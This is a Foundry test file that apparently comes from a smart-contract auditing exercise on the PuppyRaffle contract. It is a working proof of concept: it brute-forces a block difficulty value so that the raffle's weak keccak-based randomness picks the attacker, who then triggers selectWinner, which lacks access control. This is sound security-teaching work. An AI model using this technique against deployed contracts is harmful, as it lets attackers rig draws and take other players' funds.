// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleWeakRandomnessTest is Test {
    PuppyRaffle public puppyRaffle;

    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);

        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }

    function test_weak_randomness_attacker_wins() public {
        address attacker = makeAddr("attacker");
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = attacker;
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);

        uint256 attackerIndex = puppyRaffle.getActivePlayerIndex(attacker);
        vm.warp(block.timestamp + duration + 1);

        uint256 numPlayers = 5; // 4 from setUp + attacker
        uint256 winningDifficulty;
        bool found;

        // The RNG inputs are all known before the call, so the attacker can
        // brute-force a block.difficulty value off-chain that makes them win.
        for (uint256 d = 0; d < 100; d++) {
            uint256 predictedIndex = uint256(
                keccak256(abi.encodePacked(attacker, block.timestamp, d))
            ) % numPlayers;

            if (predictedIndex == attackerIndex) {
                winningDifficulty = d;
                found = true;
                break;
            }
        }
        assertTrue(found);

        vm.difficulty(winningDifficulty);

        // selectWinner has no access control: anyone can trigger the draw.
        vm.prank(attacker);
        puppyRaffle.selectWinner();

        assertEq(puppyRaffle.previousWinner(), attacker);
    }
}
